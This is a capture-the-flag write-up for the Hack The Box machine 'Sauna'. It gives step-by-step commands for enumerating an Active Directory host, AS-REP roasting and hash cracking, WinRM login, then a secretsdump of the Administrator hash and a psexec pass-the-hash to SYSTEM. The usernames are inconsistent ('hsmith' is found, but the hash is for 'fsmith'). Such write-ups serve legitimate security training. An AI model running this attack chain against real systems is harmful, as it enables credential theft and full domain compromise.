# HTB - Sauna

**IP Address:** `10.10.10.175`  
**OS:** Windows  
**Difficulty:** Easy  
**Tags:** #SMB, #Kerberos, #LDAP, #AS-REPRoasting, #BloodHound, #WinRM, #PrivilegeEscalation

---

## 1. Initial Enumeration

### 1.1 Connectivity Check

```bash
ping -c 1 10.10.10.175
```

✅ Host is up

---

### 1.2 Port Scanning

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.175 -oG allPorts
```

**Open Ports:**

```
53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 5985, 9389, 49668, 49673, 49674, 49677, 49689, 49696
```

Targeted scan with scripts:

```bash
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49668,49673,49674,49677,49689,49696 10.10.10.175 -oN targeted
```

📌 Identified domain: `EGOTISTICAL-BANK.LOCAL`

---

## 2. Service Enumeration

### 2.1 SMB

```bash
crackmapexec smb 10.10.10.175
```

Result:

```
Windows 10 / Server 2019 Build 17763 x64
```

Attempted share listing (unsuccessful):

```bash
crackmapexec smb 10.10.10.175 --shares
smbmap -H 10.10.10.175
smbclient -L 10.10.10.175 -N
```

---

### 2.2 LDAP

```bash
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' | grep "dn: CN="
```

Discovered user: `Hugo Smith`

---

## 3. Username Discovery

Generated a custom wordlist (`users.txt`):

```
hugosmith
hugo.smith
hsmith
h.smith
hugo.s
```

User enumeration using Kerbrute:

```bash
/opt/kerbrute/kerbrute userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 users.txt
```

✅ Valid user found: `hsmith`

---

## 4. AS-REP Roasting Attack

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users.txt
```

✅ Hash retrieved for `fsmith`

Crack the hash using hashcat:

```bash
hashcat -m 18200 -a 0 hash_fsmith /usr/share/wordlists/rockyou.txt
```

🔑 Recovered password: `Thestrokes23`

---

## 5. Initial Access

Login via WinRM:

```bash
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
```

✅ Successful login  
🏁 **User flag retrieved**

---

## 6. Privilege Escalation

### 6.1 Enumeration with winPEAS

1. Created folder: `C:\Windows\Temp\Recon`
    
2. Uploaded `winPEAS.exe`
    
3. Executed and reviewed output
    

Discovered credentials for user: `svc_loanmgr`

---

### 6.2 Access as svc_loanmgr

Validation:

```bash
crackmapexec smb 10.10.10.175 -u svc_loanmgr -p '<password>'
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p '<password>'
```

✅ Successful login

---

### 6.3 BloodHound Enumeration

1. Uploaded and ran `SharpHound.ps1`
    
2. Collected and analyzed data with BloodHound
    

Discovered path to dump Administrator hash

---

### 6.4 Dumping Administrator Hash and Remote Execution

```bash
impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
```

Used recovered hash:

```bash
impacket-psexec EGOTISTICAL-BANK.LOCAL/Administrator@10.10.10.175 cmd.exe -hashes :<HASH>
```

✅ SYSTEM shell obtained  
🏁 **Root flag retrieved**

---

# ✅ MACHINE COMPLETE